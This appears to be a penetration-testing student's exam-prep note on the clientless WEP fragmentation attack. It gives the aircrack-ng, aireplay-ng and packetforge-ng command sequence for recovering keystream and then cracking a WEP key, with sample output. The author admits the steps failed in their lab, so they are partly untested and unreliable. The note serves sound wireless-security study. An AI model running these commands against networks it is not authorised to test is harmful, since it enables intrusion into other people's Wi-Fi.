# Fragmentation (Clientless) (WEP)

This attack, when successful, can obtain 1500 bytes of PRGA (pseudo random generation algorithm). This attack does not recover the WEP key itself, but merely obtains the PRGA. The PRGA can then be used to generate packets with packetforge-ng which are in turn used for various injection attacks. It requires at least one data packet to be received from the access point in order to initiate the attack.

Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the access point (AP). If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained or sometimes less then 1500 bytes.

## Commands

***NOTE: Fragmentation attack does not appear to be supported in my lab. Even injection testing fails between two adapters. These steps assume that it works just in case the exam asks for it.***

* Run [setup](../../setup.md) first
* Two terminals are needed
* NO clients associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack with prolonged reassociation timing (every 60 secs)
sudo aireplay-ng --fakeauth 60 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# [Terminal Three]
sudo aireplay-ng --fragment -b $BSSID -h $INTERFACEMAC $INTERFACE

# Wait for 'Use this packet y' then enter y
# If successful - look for 'Got RELAYED packet!!' message
# Look for a fragment-*.xor file
# I could not get this far :(

# Forge a fake packet, -l source, -k destination
sudo packetforge-ng -0 -a $BSSID -h $INTERFACEMAC -l 255.255.255.255 -k 255.255.255.255 -y fragment-0613-175215.xor -w inject.cap

# Check veracity of file
tcpdump -n -vvv -e -s0 -r inject.cap

reading from file inject.cap, link-type IEEE802_11 (802.11), snapshot length 65535
17:55:05.191216 Protected 258us BSSID:AA:BB:CC:DD:EE:FF SA:FF:EE:DD:CC:BB:AA DA:ff:ff:ff:ff:ff:ff Data IV:5cbca Pad 0 KeyID 0

# Run the interactive attack against the client
sudo aireplay-ng --interactive -r inject.cap $INTERFACE

# Watch for the data to explode in size with lots of IVs :)
# If successful, data should get large
# Stop everything

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng -0 $PCAP
```

* View the output for the success message

```
Reading packets, please wait...
Opening wifu-01.cap
Read 441431 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  wifu                      WEGot 74852 out of 70000 IVsStarting PTW attack with 74852 ivs.
                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )
ChoosingDecrypted correctly: 100%
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation)
